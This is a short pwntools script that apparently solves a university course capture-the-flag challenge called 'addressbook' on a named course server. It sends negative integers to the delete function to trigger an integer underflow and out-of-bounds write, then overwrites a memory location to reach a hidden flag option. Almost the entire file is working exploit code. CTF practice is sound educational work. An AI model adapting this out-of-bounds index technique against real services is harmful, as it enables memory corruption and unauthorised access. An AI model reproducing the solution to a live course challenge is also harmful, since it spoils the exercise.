# pwntools is a very powerful library for doing exploitation
from pwn import *
from subprocess import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 2774
BINARY = "./addressbook"

r = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge
# r = process(BINARY)   # use process instead of remote to execute the local version of the program
# pause()

ADD = b'2'
LST = b'1'
DELA = b'4'
PREM = b'999'

# TODO: Fill in your payload
ADD = b'2'
DELA = b'4'

r.sendline(DELA)
r.sendline(b'-2147483647') # to MAX_INT
r.sendline(DELA)
r.sendline(b'-2147483648') # to -1

r.sendline(ADD)
# now &contact[-1] address is 0x602098
r.sendline(b'AAAAA') # name
r.sendline(b'AAAAA') # contact
# yay flag!
r.sendline(b'999')



# # earlier, the script helps us send/receive data to/from the service
# # with interactive, we can directly interact with the service
r.interactive()